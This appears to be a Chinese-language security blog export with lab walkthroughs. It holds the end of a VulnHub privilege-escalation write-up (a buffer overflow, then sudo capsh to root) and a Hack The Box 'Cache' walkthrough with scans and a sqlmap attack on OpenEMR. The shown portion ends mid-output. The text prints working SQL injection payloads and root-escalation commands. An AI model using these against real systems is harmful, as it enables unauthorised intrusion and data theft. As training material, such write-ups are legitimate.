<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1</span><br><span class="line">Why are you here ?!</span><br><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111111111111111111111111111</span><br><span class="line">æ®µé”™è¯¯</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure>

<p><code>è¾“å…¥34ä¸ªå­—ç¬¦ï¼Œå³å¯æ­£ç¡®æº¢å‡º</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">bla</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure>

<p><code>ææƒ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh-4.2$ cd /home/bla/</span><br><span class="line">sh-4.2$ ls</span><br><span class="line">user.txt  ynetd</span><br><span class="line">sh-4.2$ cat user.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _____ _ _      ____                                     _____ </span><br><span class="line"> |  ___(_) | ___/ ___|  ___ _ ____   _____ _ __          |___ / </span><br><span class="line"> | |_  | | |/ _ \___ \ / _ \ &#x27;__\ \ / / _ \ &#x27;__|  _____    |_ \ </span><br><span class="line"> |  _| | | |  __/___) |  __/ |   \ V /  __/ |    |_____|  ___) |</span><br><span class="line"> |_|   |_|_|\___|____/ \___|_|    \_/ \___|_|            |____/ </span><br><span class="line">                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Flag : 0aab4a2c6d75db7ca2542e0dacc3a30f</span><br><span class="line"></span><br><span class="line">you can crack this hash, because it is also my pasword</span><br><span class="line"></span><br><span class="line">note: crack it, itiseasy</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure>

<p><code>æ ¹æ®æç¤ºï¼Œflagå°±æ˜¯blaå¯†ç ,ä¸‹é¢è¿›è¡Œè§£ç </code></p>
<p><code>è§£ç ä¸ºitiseasy</code></p>
<img src="/2020/09/26/CK-03/image-20200926095848740.png" class>

<p><code>ç™»å…¥bla</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh-4.2$ su bla</span><br><span class="line">å¯†ç ï¼š</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure>

<p><code>ææƒï¼Œå¯ä»¥çœ‹åˆ°/usr/sbin/capshä¸éœ€è¦å¯†ç </code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo -l</span><br><span class="line">åŒ¹é…æ­¤ä¸»æœºä¸Š bla çš„é»˜è®¤æ¡ç›®ï¼š</span><br><span class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;,</span><br><span class="line">    env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span><br><span class="line">    LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS</span><br><span class="line">    _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</span><br><span class="line"></span><br><span class="line">ç”¨æˆ· bla å¯ä»¥åœ¨è¯¥ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/capsh, (ALL) /usr/sbin/setcap</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹/usr/sbin/capshå‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°--ä¸ºé‡æ–°ç”Ÿæˆå‚æ•°/bin/bash</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[bla@fileserver ~]$ &#x2F;usr&#x2F;sbin&#x2F;capsh -h</span><br><span class="line">usage: &#x2F;usr&#x2F;sbin&#x2F;capsh [args ...]</span><br><span class="line">  --help         this message (or try &#39;man capsh&#39;)</span><br><span class="line">  --print        display capability relevant state</span><br><span class="line">  --decode&#x3D;xxx   decode a hex string to a list of caps</span><br><span class="line">  --supports&#x3D;xxx exit 1 if capability xxx unsupported</span><br><span class="line">  --drop&#x3D;xxx     remove xxx,.. capabilities from bset</span><br><span class="line">  --caps&#x3D;xxx     set caps as per cap_from_text()</span><br><span class="line">  --inh&#x3D;xxx      set xxx,.. inheritiable set</span><br><span class="line">  --secbits&#x3D;&lt;n&gt;  write a new value for securebits</span><br><span class="line">  --keep&#x3D;&lt;n&gt;     set keep-capabability bit to &lt;n&gt;</span><br><span class="line">  --uid&#x3D;&lt;n&gt;      set uid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --gid&#x3D;&lt;n&gt;      set gid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --groups&#x3D;g,... set the supplemental groups</span><br><span class="line">  --user&#x3D;&lt;name&gt;  set uid,gid and groups to that of user</span><br><span class="line">  --chroot&#x3D;path  chroot(2) to this path</span><br><span class="line">  --killit&#x3D;&lt;n&gt;   send signal(n) to child</span><br><span class="line">  --forkfor&#x3D;&lt;n&gt;  fork and make child sleep for &lt;n&gt; sec</span><br><span class="line">  &#x3D;&#x3D;             re-exec(capsh) with args as for --</span><br><span class="line">  --             remaing arguments are for &#x2F;bin&#x2F;bash</span><br><span class="line">                 (without -- [&#x2F;usr&#x2F;sbin&#x2F;capsh] will simply exit(0))</span><br><span class="line">[bla@fileserver ~]$ </span><br></pre></td></tr></table></figure>

<p><code>exp</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo /usr/sbin/capsh --</span><br><span class="line">[root@fileserver bla]# whoami</span><br><span class="line">root</span><br><span class="line">[root@fileserver bla]# cd</span><br><span class="line">[root@fileserver ~]# ls</span><br><span class="line">proof.txt</span><br><span class="line">[root@fileserver ~]# cat proof.txt </span><br><span class="line">    _______ __    _____                                       _____</span><br><span class="line">   / ____(_) /__ / ___/___  ______   _____  _____            |__  /</span><br><span class="line">  / /_  / / / _ \\__ \/ _ \/ ___/ | / / _ \/ ___/  ______     /_ &lt; </span><br><span class="line"> / __/ / / /  __/__/ /  __/ /   | |/ /  __/ /     /_____/   ___/ / </span><br><span class="line">/_/   /_/_/\___/____/\___/_/    |___/\___/_/               /____/  </span><br><span class="line">                                                                   </span><br><span class="line"></span><br><span class="line">flag : 7be300997079eaebcdf9975ede6746e9</span><br><span class="line">[root@fileserver ~]#</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>vulnhub</category>
        <category>CK</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[cache]</title>
    <url>/2020/10/01/HTB-cache/</url>
    <content><![CDATA[<h2 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00.æ¦‚è¿°"></a>0x00.æ¦‚è¿°</h2><img src="/2020/10/01/HTB-cache/image-20201001085152007.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>ä»…ä»…å¼€æ”¾äº†22/80ç«¯å£</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# nmap -sC -sV -sT 10.10.10.188 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 05:02 EDT</span><br><span class="line">Nmap scan report for 10.10.10.188</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)</span><br><span class="line">|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)</span><br><span class="line">|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Cache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.34 seconds</span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure>

<h2 id="0x02-å…ˆè®¿é—®80ç«¯å£"><a href="#0x02-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x02.å…ˆè®¿é—®80ç«¯å£"></a>0x02.å…ˆè®¿é—®80ç«¯å£</h2><h3 id="1-å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™"><a href="#1-å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™" class="headerlink" title="1.å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™"></a>1.å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™</h3><img src="/2020/10/01/HTB-cache/image-20201001091003205.png" class>

<h3 id="2-ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH"><a href="#2-ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH" class="headerlink" title="2.ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH"></a>2.ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH</h3><img src="/2020/10/01/HTB-cache/image-20201001091126076.png" class>

<h3 id="3-å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­"><a href="#3-å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­" class="headerlink" title="3.å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­"></a>3.å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­</h3><img src="/2020/10/01/HTB-cache/image-20201001092153303.png" class>

<h3 id="4-å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥"><a href="#4-å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥" class="headerlink" title="4.å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥"></a>4.å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥</h3><img src="/2020/10/01/HTB-cache/image-20201001092439634.png" class>

<h3 id="5-å‘ç°ç”¨æˆ·åä¸å¯†ç "><a href="#5-å‘ç°ç”¨æˆ·åä¸å¯†ç " class="headerlink" title="5.å‘ç°ç”¨æˆ·åä¸å¯†ç "></a>5.å‘ç°ç”¨æˆ·åä¸å¯†ç </h3><img src="/2020/10/01/HTB-cache/image-20201001092533720.png" class>

<h2 id="0x03-ç™»å…¥"><a href="#0x03-ç™»å…¥" class="headerlink" title="0x03.ç™»å…¥"></a>0x03.ç™»å…¥</h2><p><code>è¿”å›ç»“æœä¾ç„¶æ˜¯æ­£åœ¨å»ºè®¾ä¸­</code></p>
<img src="/2020/10/01/HTB-cache/image-20201001092716509.png" class>

<h2 id="0x04-ä¿®æ”¹hostsæ–‡ä»¶"><a href="#0x04-ä¿®æ”¹hostsæ–‡ä»¶" class="headerlink" title="0x04.ä¿®æ”¹hostsæ–‡ä»¶"></a>0x04.ä¿®æ”¹hostsæ–‡ä»¶</h2><h3 id="1-å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•"><a href="#1-å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•" class="headerlink" title="1.å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•"></a>1.å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10.10.10.188    hms.htb</span><br></pre></td></tr></table></figure>

<h3 id="2-è®¿é—®hms-htb"><a href="#2-è®¿é—®hms-htb" class="headerlink" title="2.è®¿é—®hms.htb"></a>2.è®¿é—®hms.htb</h3><p><code>å°è¯•ashç™»å…¥ï¼Œä½†ç™»å…¥å¤±è´¥ï¼ŒCMSä¸ºOpenEmr</code></p>
<img src="/2020/10/01/HTB-cache/image-20201001151531806.png" class>

<h2 id="0x05-æ‰«æhms-htb"><a href="#0x05-æ‰«æhms-htb" class="headerlink" title="0x05.æ‰«æhms.htb"></a>0x05.æ‰«æhms.htb</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# dirb http://hms.htb</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Oct  1 08:38:25 2020</span><br><span class="line">URL_BASE: http://hms.htb/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://hms.htb/ ----</span><br><span class="line">+ http://hms.htb/admin.php (CODE:200|SIZE:937)                                       </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/common/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/config/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/contrib/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/controllers/                                           </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/custom/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/images/                                              </span><br><span class="line">+ http://hms.htb/index.php (CODE:302|SIZE:0)                                         </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/interface/                                             </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/javascript/                                           </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/library/                                               </span><br><span class="line">+ http://hms.htb/LICENSE (CODE:200|SIZE:35147)                                       </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/modules/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/portal/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/public/                                               </span><br><span class="line">+ http://hms.htb/server-status (CODE:403|SIZE:272)                                   </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/services/                                             </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/sites/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/sql/                                                   </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/templates/                                            </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/tests/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/vendor/</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="0x06-æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•"><a href="#0x06-æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•" class="headerlink" title="0x06.æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•"></a>0x06.æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•</h2><p><code>Goolgeå‘ç°å­˜åœ¨sql injection</code><span class="exturl" data-url="aHR0cHM6Ly92aWRlby5oYWNraW5nLnJldmlld3MvMjAxOC8wOC9vcGVuZW1yLXNpbXVsYXRlZC1hdHRhY2suaHRtbA==">åœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<img src="/2020/10/01/HTB-cache/image-20201001154929030.png" class>

<img src="/2020/10/01/HTB-cache/image-20201001154952482.png" class>

<img src="/2020/10/01/HTB-cache/image-20201001155008570.png" class>

<h2 id="0x07-æŠ“åŒ…"><a href="#0x07-æŠ“åŒ…" class="headerlink" title="0x07.æŠ“åŒ…"></a>0x07.æŠ“åŒ…</h2><img src="/2020/10/01/HTB-cache/image-20201001155148152.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR=00b20ha34nukojgrtj0mvigfrk; PHPSESSID=ogdqnggoo752nheh5upb7qo5mo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<h2 id="0x08-sqlmapåˆ©ç”¨"><a href="#0x08-sqlmapåˆ©ç”¨" class="headerlink" title="0x08.sqlmapåˆ©ç”¨"></a>0x08.sqlmapåˆ©ç”¨</h2><h3 id="1-å¾—åˆ°æ•°æ®åº“openemr"><a href="#1-å¾—åˆ°æ•°æ®åº“openemr" class="headerlink" title="1.å¾—åˆ°æ•°æ®åº“openemr"></a>1.å¾—åˆ°æ•°æ®åº“openemr</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# cat bp</span><br><span class="line">GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR=00b20ha34nukojgrtj0mvigfrk; PHPSESSID=ogdqnggoo752nheh5upb7qo5mo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp --dbs --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.9#stable&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 09:53:26 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[09:53:26] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[09:53:26] [INFO] testing connection to the target URL</span><br><span class="line">[09:53:27] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">[09:53:27] [INFO] checking if the target is protected by some kind of WAF/IPS</span><br><span class="line">[09:53:28] [INFO] testing if the target URL content is stable</span><br><span class="line">[09:53:29] [INFO] target URL content is stable</span><br><span class="line">[09:53:29] [INFO] testing if GET parameter &#x27;eid&#x27; is dynamic</span><br><span class="line">[09:53:29] [WARNING] GET parameter &#x27;eid&#x27; does not appear to be dynamic</span><br><span class="line">[09:53:30] [INFO] heuristic (basic) test shows that GET parameter &#x27;eid&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)</span><br><span class="line">[09:53:30] [INFO] testing for SQL injection on GET parameter &#x27;eid&#x27;</span><br><span class="line">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span><br><span class="line">[09:53:30] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br><span class="line">[09:53:30] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[09:53:34] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br><span class="line">[09:53:35] [INFO] GET parameter &#x27;eid&#x27; appears to be &#x27;Boolean-based blind - Parameter replace (original value)&#x27; injectable (with --not-string=&quot;row&quot;)</span><br><span class="line">[09:53:35] [INFO] testing &#x27;Generic inline queries&#x27;</span><br><span class="line">[09:53:35] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span><br><span class="line">[09:53:35] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span><br><span class="line">[09:53:37] [INFO] GET parameter &#x27;eid&#x27; is &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27; injectable </span><br><span class="line">[09:53:37] [INFO] testing &#x27;MySQL inline queries&#x27;</span><br><span class="line">[09:53:37] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span><br><span class="line">[09:53:37] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                     </span><br><span class="line">[09:53:40] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;</span><br><span class="line">[09:53:40] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;</span><br><span class="line">[09:53:41] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;</span><br><span class="line">[09:53:42] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query - comment)&#x27;</span><br><span class="line">[09:53:42] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query)&#x27;</span><br><span class="line">[09:53:43] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br><span class="line">[09:53:54] [INFO] GET parameter &#x27;eid&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable </span><br><span class="line">[09:53:54] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br><span class="line">[09:53:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[09:53:55] [INFO] &#x27;ORDER BY&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span><br><span class="line">[09:53:56] [INFO] target URL appears to have 4 columns in query</span><br><span class="line">[09:53:57] [INFO] GET parameter &#x27;eid&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span><br><span class="line">GET parameter &#x27;eid&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[09:53:57] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[09:53:59] [INFO] fetching database names</span><br><span class="line">[09:54:00] [INFO] retrieved: &#x27;information_schema&#x27;</span><br><span class="line">[09:54:00] [INFO] retrieved: &#x27;openemr&#x27;</span><br><span class="line">available databases [2]:                                                                                                                                    </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] openemr</span><br><span class="line"></span><br><span class="line">[09:54:00] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 09:54:00 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure>

<h3 id="2-çˆ†è¡¨"><a href="#2-çˆ†è¡¨" class="headerlink" title="2.çˆ†è¡¨"></a>2.çˆ†è¡¨</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr --tables --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [,]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 09:57:20 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[09:57:20] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[09:57:20] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[09:57:20] [INFO] testing connection to the target URL</span><br><span class="line">[09:57:21] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT 